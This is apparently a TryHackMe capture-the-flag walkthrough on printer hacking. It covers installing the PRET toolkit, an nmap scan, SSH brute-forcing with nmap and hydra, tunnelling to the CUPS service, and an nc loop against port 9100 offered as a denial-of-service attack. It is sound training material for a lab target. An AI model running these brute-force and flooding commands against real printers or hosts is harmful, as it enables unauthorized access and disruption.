# [Printer Hacking 101](https://tryhackme.com/room/printerhacking101)

> Learn about (and get hands on with) printer hacking and understand the basics of IPP.

## Prepare

install this toolkit to exploit local network printer

```
git clone https://github.com/RUB-NDS/PRET && cd PRET
python2 -m pip install colorama pysnmP
```

automatic printer discovery

```
python pret.py
```

## Scanning

scan the machine

```
nmap -sS -T4 10.10.103.120
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/695be9e7-ea0c-4688-af66-96d885f85631)

i found 2 services are ipp and ssh

## HTTP

CUPS open source print server uses IPP protocol for print management

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/ceb437d5-2046-4d3a-b664-2e1dbef73359)

In tab printers, you can see list of printers

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/bed88e27-a1f8-47a8-a1f6-7ed5f181e2b5)

click on that printer, you can see size of a test sheet

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/db0e3d0e-d134-4f29-87a2-65fa402a2f37)

## Exploitation

brute force the password using nmap to know username `printer` and hydra to `password`

```
nmap 10.10.103.120 -p 22 --script ssh-brute --script-args userdb=user.txt
hydra -l printer -P /usr/share/wordlists/rockyou.txt ssh://10.10.103.120
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/60aebfaf-7e93-46b6-8034-56365364c24f)

then connect ssh to machine through a tunnel

```
ssh printer@10.10.230.19 -T -L 3631:localhost:631
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/04b2a52d-bb25-4e15-99e8-8f485d0732bd)

now you can using cheatsheet to do a ddos attack or whatever you want

```
while true; do nc printer 9100; done
```
